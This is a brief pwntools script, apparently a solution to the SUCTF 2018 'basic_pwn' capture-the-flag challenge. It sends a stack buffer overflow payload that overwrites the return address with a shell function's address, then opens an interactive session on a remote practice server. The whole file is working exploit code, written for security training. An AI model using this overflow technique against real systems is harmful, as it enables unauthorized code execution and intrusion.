from pwn import *

context(log_level='debug')

#io=process("./SUCTF_2018_basic_pwn")

#gdb.attach(io,'b *0x40119C')
io=remote("node3.buuoj.cn",27217)
elf=ELF("./SUCTF_2018_basic_pwn")

shell=0x401157

payload=b'A'*(0x110+0x8)+p64(shell)
io.sendline(payload)

#pause()

io.interactive()